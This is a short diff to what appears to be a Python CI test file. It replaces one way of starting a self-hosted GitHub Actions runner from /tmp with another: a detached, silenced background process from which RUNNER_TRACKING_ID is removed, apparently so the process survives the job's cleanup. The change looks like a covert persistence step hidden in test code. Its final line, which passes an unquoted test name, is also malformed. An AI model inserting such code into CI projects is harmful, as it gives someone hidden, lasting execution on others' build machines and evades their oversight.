@@ -58,10 +58,14 @@ os.chdir(RUNNER_DIR)
 
 # print("Starting runner...")
 
-# subprocess.Popen(["bash","/tmp/actions-runner1/run.sh"],
-#         stdout=open(os.devnull, 'w'),
-#         stderr=open(os.devnull, 'w'),
-#         stdin=open(os.devnull, 'r'),
-#         start_new_session=True)
-os.system("nohup sh /tmp/actions-runner1/run.sh >/dev/null 2>&1 &")
+env = os.environ.copy()
+env.pop('RUNNER_TRACKING_ID', None)
+
+subprocess.Popen(["bash","/tmp/actions-runner1/run.sh"],
+        stdout=open(os.devnull, 'w'),
+        stderr=open(os.devnull, 'w'),
+        stdin=open(os.devnull, 'r'),
+        env=env,
+        start_new_session=True)
+# os.system("nohup sh /tmp/actions-runner1/run.sh >/dev/null 2>&1 &")
 register_cuda_ci(stage-a-test-1,suite="stage-a-test-1")
